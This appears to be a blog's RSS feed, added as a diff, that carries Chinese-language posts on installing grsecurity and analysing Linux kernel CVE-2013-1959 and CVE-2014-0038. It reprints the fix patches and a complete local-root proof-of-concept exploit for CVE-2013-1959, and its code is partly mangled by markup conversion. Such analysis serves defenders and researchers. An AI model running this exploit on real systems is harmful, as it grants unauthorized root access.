@@ -1,0 +1,846 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>seteuid0's blog</title><link>/</link><description>Recent content on seteuid0's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This is a customized copyright.</copyright><lastBuildDate>Sun, 18 Apr 2021 11:16:32 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>grsecurity系列之一:概述及简易安装部署</title><link>/posts/grsecurity%e7%b3%bb%e5%88%97%e4%b9%8b%e4%b8%80%e6%a6%82%e8%bf%b0%e5%8f%8a%e7%ae%80%e6%98%93%e5%ae%89%e8%a3%85%e9%83%a8%e7%bd%b2/</link><pubDate>Thu, 20 Nov 2014 14:52:52 +0000</pubDate><guid>/posts/grsecurity%e7%b3%bb%e5%88%97%e4%b9%8b%e4%b8%80%e6%a6%82%e8%bf%b0%e5%8f%8a%e7%ae%80%e6%98%93%e5%ae%89%e8%a3%85%e9%83%a8%e7%bd%b2/</guid><description>seteuid0's blog /posts/grsecurity%e7%b3%bb%e5%88%97%e4%b9%8b%e4%b8%80%e6%a6%82%e8%bf%b0%e5%8f%8a%e7%ae%80%e6%98%93%e5%ae%89%e8%a3%85%e9%83%a8%e7%bd%b2/ -&lt;p>近日准备分析下grsecurity，把过程总结记录下与大家分享、讨论。 SELinux应该很多人都知道，不错，它是Linux的LSM框架下强制访问控制机制中使用较为普遍的一种，由NSA开发。在RHEL、Fedora系统中可以看到它的身影，而apparmor被ubuntu维护并默认使用。基本上这两种强制访问控制机制是当前Linux系统中使用最为广泛的。grsecurity没有使用LSM框架，而是对应kernel upstream的不同主流版本发布不同的patch。部署起来没有系统默认安装的selinux、apparmor那么方便，但存在即有意义。grsecurity发展有13年之久，这么多年为什么一直都没有进入内核，以及它与selinux、apparmor相比有什么差别，此次暂不评述。不可否认的是由于grsecurity实现时超出LSM框架，所以实现了很多其他强制访问控制机制所不能、或很难实现的功能，本系列文章分别描述，如有不周，请大家批评指正。 grsecurity官网上从Memroy Corruption defenses、Filesystem Hardening、Miscellaneous Protections、RBAC、GCC Plugins几个方面描述其特性，之后做详尽描述。&lt;/p>
+&lt;h1 id="安装">安装&lt;/h1>
+&lt;p>从http://grsecurity.net/download.php可以看到当前稳定版本所对应的内核版本。下载对应的内核版本及grsecurity的patch。本处使用linux-3.2.64内核版本及&lt;a href="http://grsecurity.net/stable/grsecurity-3.0-3.2.64-201411150025.patch">grsecurity-3.0-3.2.64-201411150025.patch&lt;/a> 补丁。```
+#tar xf linux-3.2.64.tar.xz
+#cd linux-3.2.64
+#patch -p1 &amp;lt; ../grsecurity-3.0-3.2.64-201411150025.patch
+#make menuconfig
+#make DISABLE_PAX_PLUGINS=y -j8
+#make DISABLE_PAX_PLUGINS=y -j8 modules
+#sudo make DISABLE_PAX_PLUGINS=y -j8 modules_install
+#sudo make DISABLE_PAX_PLUGINS=y -j8 install&lt;/p>
+&lt;pre>&lt;code class="language-此处注意：" data-lang="此处注意：">
+1. 由于安装了gcc-&amp;lt;ver&amp;gt;-plugin-dev，还是提示无法找到，因此本次去除该特性；
+2. grsecurity的配置在&amp;quot;security options&amp;quot;-&amp;gt;&amp;quot;grsecurity&amp;quot;里面，本次可以使用Automatic配置，之后在做调整
+3. \-j8指定并行编译的进程数，可使用CPU数的2倍
+之后大家还可以下载、编译安装gradm。 重启~~~ Ok，可以开始体验grsecurity了～&lt;/code>&lt;/pre>- /posts/grsecurity%e7%b3%bb%e5%88%97%e4%b9%8b%e4%b8%80%e6%a6%82%e8%bf%b0%e5%8f%8a%e7%ae%80%e6%98%93%e5%ae%89%e8%a3%85%e9%83%a8%e7%bd%b2/ - This is a customized copyright.</description></item><item><title>CVE-2013-1959内核漏洞原理与本地提权利用代码实现分析</title><link>/posts/cve-2013-1959%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</link><pubDate>Thu, 17 Apr 2014 11:58:21 +0000</pubDate><guid>/posts/cve-2013-1959%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</guid><description>seteuid0's blog /posts/cve-2013-1959%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ -&lt;p>关键字：CVE-2013-1959，cve，kernel vulnerability，内核漏洞，POC，利用代码，本地提权，exploit， analysis,user namespace,capabilities 2013年4月28日，Andy Lutomirski在oss-security披露了该cve的细节。CVE-2013-1959是当前内核稳定版本安全补丁修复所对应的一个CVE。这个CVE的原因是在user namespace中，/proc/&lt;!-- raw HTML omitted -->uid_map存多个不正确的权限检查。如果启用相关的配置，Linux 3.8和很多3.9rcs将受到影响。利用者可以获取root权限。 修复这个CVE对应的有3个patch，以下先大致介绍这三个Patch所修改的内容。 Patch1：Add file_ns_capable() helper function for open-time capability checking```
+From 935d8aabd4331f47a89c3e1daa5779d23cf244ee Mon Sep 17 00:00:00 2001
+From: Linus Torvalds &lt;a href="mailto:torvalds@linux-foundation.org">torvalds@linux-foundation.org&lt;/a>
+Date: Sun, 14 Apr 2013 10:06:31 -0700
+Subject: [PATCH] Add file_ns_capable() helper function for open-time
+capability checking&lt;/p>
+&lt;p>Nothing is using it yet, but this will allow us to delay the open-time
+checks to use time, without breaking the normal UNIX permission
+semantics where permissions are determined by the opener (and the file
+descriptor can then be passed to a different process, or the process can
+drop capabilities).&lt;/p>
+&lt;h2 id="signed-off-by-linus-torvalds-torvaldslinux-foundationorg">Signed-off-by: Linus Torvalds &lt;a href="mailto:torvalds@linux-foundation.org">torvalds@linux-foundation.org&lt;/a>&lt;/h2>
+&lt;p>include/linux/capability.h | 2 ++
+kernel/capability.c | 24 ++++++++++++++++++++++++
+2 files changed, 26 insertions(+)&lt;/p>
+&lt;p>diff &amp;ndash;git a/include/linux/capability.h b/include/linux/capability.h
+index 98503b7..d9a4f7f4 100644
+&amp;mdash; a/include/linux/capability.h
++++ b/include/linux/capability.h
+@@ -35,6 +35,7 @@ struct cpu_vfs_cap_data {
+#define _KERNEL_CAP_T_SIZE (sizeof(kernel_cap_t))&lt;/p>
+&lt;p>+struct file;
+struct inode;
+struct dentry;
+struct user_namespace;
+@@ -211,6 +212,7 @@ extern bool capable(int cap);
+extern bool ns_capable(struct user_namespace *ns, int cap);
+extern bool nsown_capable(int cap);
+extern bool inode_capable(const struct inode *inode, int cap);
++extern bool file_ns_capable(const struct file *file, struct user_namespace *ns, int cap);&lt;/p>
+&lt;p>/* audit system wants to get cap info from files as well */
+extern int get_vfs_caps_from_disk(const struct dentry *dentry, struct cpu_vfs_cap_data *cpu_caps);
+diff &amp;ndash;git a/kernel/capability.c b/kernel/capability.c
+index 493d972..f6c2ce5 100644
+&amp;mdash; a/kernel/capability.c
++++ b/kernel/capability.c
+@@ -393,6 +393,30 @@ bool ns_capable(struct user_namespace *ns, int cap)
+EXPORT_SYMBOL(ns_capable);&lt;/p>
+&lt;p>/**&lt;/p>
+&lt;ul>
+&lt;li>* file_ns_capable - Determine if the file&amp;rsquo;s opener had a capability in effect&lt;/li>
+&lt;li>* @file: The file we want to check&lt;/li>
+&lt;li>* @ns: The usernamespace we want the capability in&lt;/li>
+&lt;li>* @cap: The capability to be tested for&lt;/li>
+&lt;li>*&lt;/li>
+&lt;li>* Return true if task that opened the file had a capability in effect&lt;/li>
+&lt;li>* when the file was opened.&lt;/li>
+&lt;li>*&lt;/li>
+&lt;li>* This does not set PF_SUPERPRIV because the caller may not&lt;/li>
+&lt;li>* actually be privileged.&lt;/li>
+&lt;li>*/
++bool file_ns_capable(const struct file *file, struct user_namespace *ns, int cap)
++{&lt;/li>
+&lt;li>if (WARN_ON_ONCE(!cap_valid(cap)))&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> return false;
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>&lt;/li>
+&lt;li>if (security_capable(file-&amp;gt;f_cred, ns, cap) == 0)&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> return true;
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>&lt;/li>
+&lt;li>return false;
++}
++EXPORT_SYMBOL(file_ns_capable);&lt;/li>
+&lt;li>&lt;/li>
+&lt;/ul>
+&lt;h2 id="heading">+/**
+* capable - Determine if the current task has a superior capability in effect
+* @cap: The capability to be tested for
+*&lt;/h2>
+&lt;p>1.9.0
+&lt;code>在这个patch中，linus实现了一个file\_ns\_capable函数，这个函数检查文件的打开者是否有权限对文件进行操作。 Patch2:userns: Check uid\_map's opener's fsuid, not the current fsuid&lt;/code>
+From e3211c120a85b792978bcb4be7b2886df18d27f0 Mon Sep 17 00:00:00 2001
+From: Andy Lutomirski &lt;a href="mailto:luto@amacapital.net">luto@amacapital.net&lt;/a>
+Date: Sun, 14 Apr 2013 16:28:19 -0700
+Subject: [PATCH] userns: Check uid_map&amp;rsquo;s opener&amp;rsquo;s fsuid, not the current fsuid&lt;/p>
+&lt;h2 id="signed-off-by-andy-lutomirski-lutoamacapitalnet">Signed-off-by: Andy Lutomirski &lt;a href="mailto:luto@amacapital.net">luto@amacapital.net&lt;/a>&lt;/h2>
+&lt;p>kernel/user_namespace.c | 4 ++&amp;ndash;
+1 file changed, 2 insertions(+), 2 deletions(-)&lt;/p>
+&lt;p>diff &amp;ndash;git a/kernel/user_namespace.c b/kernel/user_namespace.c
+index e2d4ace..5c16f3a 100644
+&amp;mdash; a/kernel/user_namespace.c
++++ b/kernel/user_namespace.c
+@@ -797,12 +797,12 @@ static bool new_idmap_permitted(const struct file *file,
+u32 id = new_map-&amp;gt;extent[0].lower_first;
+if (cap_setid == CAP_SETUID) {
+kuid_t uid = make_kuid(ns-&amp;gt;parent, id);&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> if (uid\_eq(uid, current\_fsuid()))
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> if (uid\_eq(uid, file-&amp;gt;f\_cred-&amp;gt;fsuid))
+return true;
+}
+else if (cap\_setid == CAP\_SETGID) {
+kgid\_t gid = make\_kgid(ns-&amp;gt;parent, id);
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> if (gid\_eq(gid, current\_fsgid()))
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> if (gid\_eq(gid, file-&amp;gt;f\_cred-&amp;gt;fsgid))
+return true;
+}
+&lt;/code>&lt;/pre>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>}&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>1.9.0&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>该patch检查uid\_map的打开者的fsuid，而不是当前的fsuid。 Patch3:userns: Don't let unprivileged users trick privileged users into setting the id\_map&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>From 6708075f104c3c9b04b23336bb0366ca30c3931b Mon Sep 17 00:00:00 2001&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>From: &amp;ldquo;Eric W. Biederman&amp;rdquo; &lt;a href="mailto:ebiederm@xmission.com">ebiederm@xmission.com&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Date: Sun, 14 Apr 2013 13:47:02 -0700&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Subject: [PATCH] userns: Don&amp;rsquo;t let unprivileged users trick privileged users&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>into setting the id_map&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;/li>
+&lt;/ul>
+&lt;p>When we require privilege for setting /proc/&lt;!-- raw HTML omitted -->/uid_map or
+/proc/&lt;!-- raw HTML omitted -->/gid_map no longer allow an unprivileged user to
+open the file and pass it to a privileged program to write
+to the file.&lt;/p>
+&lt;p>Instead when privilege is required require both the opener and the
+writer to have the necessary capabilities.&lt;/p>
+&lt;p>I have tested this code and verified that setting /proc/&lt;!-- raw HTML omitted -->/uid_map
+fails when an unprivileged user opens the file and a privielged user
+attempts to set the mapping, that unprivileged users can still map
+their own id, and that a privileged users can still setup an arbitrary
+mapping.&lt;/p>
+&lt;h2 id="signed-off-by-andy-lutomirski-lutoamacapitalnet-1">Reported-by: Andy Lutomirski &lt;a href="mailto:luto@amacapital.net">luto@amacapital.net&lt;/a>
+Signed-off-by: &amp;ldquo;Eric W. Biederman&amp;rdquo; &lt;a href="mailto:ebiederm@xmission.com">ebiederm@xmission.com&lt;/a>
+Signed-off-by: Andy Lutomirski &lt;a href="mailto:luto@amacapital.net">luto@amacapital.net&lt;/a>&lt;/h2>
+&lt;p>kernel/user_namespace.c | 12 ++++++++&amp;mdash;-
+1 file changed, 8 insertions(+), 4 deletions(-)&lt;/p>
+&lt;p>diff &amp;ndash;git a/kernel/user_namespace.c b/kernel/user_namespace.c
+index a54f26f..e2d4ace 100644
+&amp;mdash; a/kernel/user_namespace.c
++++ b/kernel/user_namespace.c
+@@ -25,7 +25,8 @@&lt;/p>
+&lt;p>static struct kmem_cache *user_ns_cachep __read_mostly;&lt;/p>
+&lt;p>-static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,
++static bool new_idmap_permitted(const struct file *file,&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> struct user\_namespace \*ns, int cap\_setid,
+struct uid\_gid\_map \*map);
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;p>static void set_cred_user_ns(struct cred *cred, struct user_namespace *user_ns)
+@@ -700,7 +701,7 @@ static ssize_t map_write(struct file *file, const char __user *buf,&lt;/p>
+&lt;pre>&lt;code>ret = -EPERM;
+/\* Validate the user is allowed to use user id's mapped to. \*/
+&lt;/code>&lt;/pre>
+&lt;ul>
+&lt;li>if (!new_idmap_permitted(ns, cap_setid, &amp;amp;new_map))&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;p>if (!new_idmap_permitted(file, ns, cap_setid, &amp;amp;new_map))
+goto out;&lt;/p>
+&lt;p>/* Map the lower ids from the parent user namespace to the
+@@ -787,7 +788,8 @@ ssize_t proc_projid_map_write(struct file *file, const char __user *buf, size_t
+&amp;amp;ns-&amp;gt;projid_map, &amp;amp;ns-&amp;gt;parent-&amp;gt;projid_map);
+}&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>-static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,
++static bool new_idmap_permitted(const struct file *file,&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;pre>&lt;code> struct user\_namespace \*ns, int cap\_setid,
+struct uid\_gid\_map \*new\_map)
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;p>{
+/* Allow mapping to your own filesystem ids */
+@@ -811,8 +813,10 @@ static bool new_idmap_permitted(struct user_namespace *ns, int cap_setid,&lt;/p>
+&lt;pre>&lt;code>/\* Allow the specified ids if we have the appropriate capability
+\* (CAP\_SETUID or CAP\_SETGID) over the parent user namespace.
+&lt;/code>&lt;/pre>
+&lt;ul>
+&lt;li>* And the opener of the id file also had the approprpiate capability.
+*/&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>if (ns_capable(ns-&amp;gt;parent, cap_setid))&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>if (ns_capable(ns-&amp;gt;parent, cap_setid) &amp;amp;&amp;amp;&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> file\_ns\_capable(file, ns-&amp;gt;parent, cap\_setid))
+return true;
+&lt;/code>&lt;/pre>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>return false;&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>1.9.0&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;code>这个patch就是调用前面两个patch的修改内容，当对uid\_map或gid\_map文件进行写操作的时候（也就是建立kuid和uid映射的时候）增加对文件打开者的检查。   看了这三个patch以后，应该也就知道该CVE的原因了。由于对uid\_map或gid\_map的写检查缺少对打开者的检查，这样攻击者可以使用非特权用户打开uid\_map文件，然后使用特权程序对该文件进行写操作。通过这样的方式欺骗内核，用户便可以执行setuid操作进行权限提升。 下面是对应的POC代码&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/* userns_root_sploit.c by */&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/* Copyright (c) 2013 Andrew Lutomirski. All rights reserved. */&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/* You may use, modify, and redistribute this code under the GPLv2. */&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;/li>
+&lt;/ul>
+&lt;p>#define _GNU_SOURCE
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sched.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/wait.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;err.h&amp;gt;
+#include &amp;lt;linux/futex.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/syscall.h&amp;gt;&lt;/p>
+&lt;p>#ifndef CLONE_NEWUSER
+#define CLONE_NEWUSER 0x10000000
+#endif&lt;/p>
+&lt;p>pid_t parent;
+int *ftx;&lt;/p>
+&lt;p>int childfn()
+{
+int fd;
+char buf[128];&lt;/p>
+&lt;p>if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &amp;amp;&amp;amp;
+errno != EWOULDBLOCK)
+err(1, &amp;ldquo;futex&amp;rdquo;);&lt;/p>
+&lt;p>sprintf(buf, &amp;ldquo;/proc/%ld/uid_map&amp;rdquo;, (long)parent);
+fd = open(buf, O_RDWR | O_CLOEXEC);
+if (fd == -1)
+err(1, &amp;ldquo;open %s&amp;rdquo;, buf);
+if (dup2(fd, 1) != 1)
+err(1, &amp;ldquo;dup2&amp;rdquo;);&lt;/p>
+&lt;p>// Write something like &amp;ldquo;0 0 1&amp;rdquo; to stdout with elevated capabilities.
+execl(&amp;quot;./zerozeroone&amp;quot;, &amp;ldquo;./zerozeroone&amp;rdquo;);&lt;/p>
+&lt;p>return 0;
+}&lt;/p>
+&lt;p>int main(int argc, char **argv)
+{
+int dummy, status;
+pid_t child;&lt;/p>
+&lt;p>if (argc &amp;lt; 2) {
+printf(&amp;ldquo;usage: userns_root_sploit COMMAND ARGS&amp;hellip;\n\n&amp;rdquo;
+&amp;ldquo;This will run a command as (global) uid 0 but no capabilities.\n&amp;rdquo;);
+return 1;
+}&lt;/p>
+&lt;p>ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,
+MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+if (ftx == MAP_FAILED)
+err(1, &amp;ldquo;mmap&amp;rdquo;);&lt;/p>
+&lt;p>parent = getpid();&lt;/p>
+&lt;p>if (signal(SIGCHLD, SIG_DFL) != 0)
+err(1, &amp;ldquo;signal&amp;rdquo;);&lt;/p>
+&lt;p>child = fork();
+if (child == -1)
+err(1, &amp;ldquo;fork&amp;rdquo;);
+if (child == 0)
+return childfn();&lt;/p>
+&lt;p>*ftx = 1;
+if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
+err(1, &amp;ldquo;futex&amp;rdquo;);&lt;/p>
+&lt;p>if (unshare(CLONE_NEWUSER) != 0)
+err(1, &amp;ldquo;unshare(CLONE_NEWUSER)&amp;quot;);&lt;/p>
+&lt;p>if (wait(&amp;amp;status) != child)
+err(1, &amp;ldquo;wait&amp;rdquo;);
+if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+errx(1, &amp;ldquo;child failed&amp;rdquo;);&lt;/p>
+&lt;p>if (setresuid(0, 0, 0) != 0)
+err(1, &amp;ldquo;setresuid&amp;rdquo;);
+execvp(argv[1], argv+1);
+err(1, argv[1]);&lt;/p>
+&lt;p>return 0;
+}&lt;/p>
+&lt;pre>&lt;code class="language-该POC代码原理如上所述，在父进程中调用unshare使用新的user namespace.然后通过子进程中打开uid\_map文件，执行一个特权程序通过管道写该文件，建立kuid和uid的映射关系。之后父进程调用setresuid(0,0,0)来获取root权限。在这里父子进程通过使用futex系统调用 来实现同步，在子进程执行结束后父进程再调用setresuid。" data-lang="该POC代码原理如上所述，在父进程中调用unshare使用新的user namespace.然后通过子进程中打开uid\_map文件，执行一个特权程序通过管道写该文件，建立kuid和uid的映射关系。之后父进程调用setresuid(0,0,0)来获取root权限。在这里父子进程通过使用futex系统调用 来实现同步，在子进程执行结束后父进程再调用setresuid。">&lt;/code>&lt;/pre>- /posts/cve-2013-1959%e5%86%85%e6%a0%b8%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ - This is a customized copyright.</description></item><item><title>内核CVE-2014-0038漏洞原理与本地提权利用代码实现分析</title><link>/posts/%e5%86%85%e6%a0%b8cve-2014-0038%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</link><pubDate>Tue, 25 Mar 2014 17:30:02 +0000</pubDate><guid>/posts/%e5%86%85%e6%a0%b8cve-2014-0038%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/</guid><description>seteuid0's blog /posts/%e5%86%85%e6%a0%b8cve-2014-0038%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%e4%b8%8e%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%9d%83%e5%88%a9%e7%94%a8%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ -&lt;p>关键字：CVE-2014-0038，内核漏洞，POC，利用代码，本地提权，提权，exploit，cve analysis, privilege escalation, cve, kernel vulnerability&lt;/p>
+&lt;h3 id="简介">简介&lt;/h3>
+&lt;p>2014年1月31号时，solar在oss-sec邮件列表里公布了该CVE（cve-2014-0038）。这个CVE涉及到X32 ABI。X32 ABI在内核linux3.4中被合并进来，但RHEL/fedora等发行版并没有开启该编译选项，因此未受该CVE影响。Ubuntu系统在近期的版本中开启了该选项，因此收该CVE影响。X32 ABI就是在64位环境中使用32位地址，效率有所提升，相关信息请参照参考资料或google。&lt;/p>
+&lt;h3 id="漏洞原理">漏洞原理&lt;/h3>
+&lt;p>先看该CVE对应的patch```
+diff &amp;ndash;git a/net/compat.c b/net/compat.c
+index dd32e34..f50161f 100644
+&amp;mdash; a/net/compat.c
++++ b/net/compat.c
+@@ -780,21 +780,16 @@ asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,
+if (flags &amp;amp; MSG_CMSG_COMPAT)
+return -EINVAL;&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>if (COMPAT_USE_64BIT_TIME)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> return \_\_sys\_recvmmsg(fd, (struct mmsghdr \_\_user \*)mmsg, vlen,
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> flags | MSG\_CMSG\_COMPAT,
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>
+&lt;pre>&lt;code> (struct timespec \*) timeout);
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>
+&lt;p>if (timeout == NULL)
+return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+flags | MSG_CMSG_COMPAT, NULL);&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>if (get_compat_timespec(&amp;amp;ktspec, timeout))&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;p>if (compat_get_timespec(&amp;amp;ktspec, timeout))
+return -EFAULT;&lt;/p>
+&lt;p>datagrams = __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+flags | MSG_CMSG_COMPAT, &amp;amp;ktspec);&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>if (datagrams &amp;gt; 0 &amp;amp;&amp;amp; put_compat_timespec(&amp;amp;ktspec, timeout))&lt;/li>
+&lt;/ul>
+&lt;ul>
+&lt;li>
+&lt;p>if (datagrams &amp;gt; 0 &amp;amp;&amp;amp; compat_put_timespec(&amp;amp;ktspec, timeout))
+datagrams = -EFAULT;&lt;/p>
+&lt;p>return datagrams;
+&lt;code>该CVE引入的原因就是没有对用户空间的输入信息进行拷贝处理，直接将用户空间输入的timeout指针传递给\_\_sys\_recvmmsg函数进行处理。正如patch中的修改方式，当timeout参数非空时，调用compat\_get\_timespec先对timetou进行处理，而该函数会对用户空间的timeout进行copy处理。&lt;/code>
+int compat_get_timespec(struct timespec *ts, const void __user *uts)
+{
+if (COMPAT_USE_64BIT_TIME)
+return copy_from_user(ts, uts, sizeof *ts) ? -EFAULT : 0;
+else
+return get_compat_timespec(ts, uts);
+}
+&lt;code>那么我们再来看传递进来的timeout会进行什么操作呢？在 \_\_sys\_recvmmsg里面。&lt;/code>
+/*
+* Linux recvmmsg interface
+*/&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>int __sys_recvmmsg(int fd, struct mmsghdr __user *mmsg, unsigned int vlen,
+unsigned int flags, struct timespec *timeout)
+{
+int fput_needed, err, datagrams;
+struct socket *sock;
+struct mmsghdr __user *entry;
+struct compat_mmsghdr __user *compat_entry;
+struct msghdr msg_sys;
+struct timespec end_time;&lt;/p>
+&lt;pre>&lt;code>if (timeout &amp;amp;&amp;amp;
+poll\_select\_set\_timeout(&amp;amp;end\_time, timeout-&amp;gt;tv\_sec,
+timeout-&amp;gt;tv\_nsec))
+return -EINVAL;
+datagrams = 0;
+sock = sockfd\_lookup\_light(fd, &amp;amp;err, &amp;amp;fput\_needed);
+if (!sock)
+return err;
+err = sock\_error(sock-&amp;gt;sk);
+if (err)
+goto out\_put;
+entry = mmsg;
+compat\_entry = (struct compat\_mmsghdr \_\_user \*)mmsg;
+while (datagrams &amp;lt; vlen) {
+/\*
+\* No need to ask LSM for more than the first datagram.
+\*/
+if (MSG\_CMSG\_COMPAT &amp;amp; flags) {
+err = \_\_\_sys\_recvmsg(sock, (struct msghdr \_\_user \*)compat\_entry,
+&amp;amp;msg\_sys, flags &amp;amp; ~MSG\_WAITFORONE,
+datagrams);
+if (err &amp;lt; 0)
+break;
+err = \_\_put\_user(err, &amp;amp;compat\_entry-&amp;gt;msg\_len);
+++compat\_entry;
+} else {
+err = \_\_\_sys\_recvmsg(sock,
+(struct msghdr \_\_user \*)entry,
+&amp;amp;msg\_sys, flags &amp;amp; ~MSG\_WAITFORONE,
+datagrams);
+if (err &amp;lt; 0)
+break;
+err = put\_user(err, &amp;amp;entry-&amp;gt;msg\_len);
+++entry;
+}
+if (err)
+break;
+++datagrams;
+/\* MSG\_WAITFORONE turns on MSG\_DONTWAIT after one packet \*/
+if (flags &amp;amp; MSG\_WAITFORONE)
+flags |= MSG\_DONTWAIT;
+if (timeout) {
+ktime\_get\_ts(timeout);
+\*timeout = timespec\_sub(end\_time, \*timeout);
+if (timeout-&amp;gt;tv\_sec &amp;lt; 0) {
+timeout-&amp;gt;tv\_sec = timeout-&amp;gt;tv\_nsec = 0;
+break;
+}
+/\* Timeout, return less than vlen datagrams \*/
+if (timeout-&amp;gt;tv\_nsec == 0 &amp;amp;&amp;amp; timeout-&amp;gt;tv\_sec == 0)
+break;
+}
+/\* Out of band data, return right away \*/
+if (msg\_sys.msg\_flags &amp;amp; MSG\_OOB)
+break;
+}
+&lt;/code>&lt;/pre>
+&lt;p>out_put:
+fput_light(sock-&amp;gt;file, fput_needed);&lt;/p>
+&lt;pre>&lt;code>if (err == 0)
+return datagrams;
+if (datagrams != 0) {
+/\*
+\* We may return less entries than requested (vlen) if the
+\* sock is non block and there aren't enough datagrams...
+\*/
+if (err != -EAGAIN) {
+/\*
+\* ... or if recvmsg returns an error after we
+\* received some datagrams, where we record the
+\* error to return on the next call or if the
+\* app asks about it using getsockopt(SO\_ERROR).
